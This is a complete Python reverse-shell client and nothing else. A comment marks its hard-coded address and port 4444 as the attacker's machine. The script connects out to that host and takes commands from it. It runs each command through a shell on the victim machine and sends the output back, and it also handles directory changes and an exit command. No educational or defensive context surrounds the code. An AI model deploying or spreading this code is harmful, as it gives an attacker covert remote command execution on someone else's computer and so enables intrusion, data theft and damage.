import socket
import subprocess
import os

# Server IP and port (attacker's machine)
SERVER_IP = "10.35.112.65"
SERVER_PORT = 4444

def connect():
    s = socket.socket()
    s.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(f"Changed directory to {os.getcwd()}".encode())
            except Exception as e:
                s.send(str(e).encode())
        else:
            try:
                output = subprocess.check_output(command, shell=True)
                s.send(output)
            except Exception as e:
                s.send(str(e).encode())

    s.close()

connect()
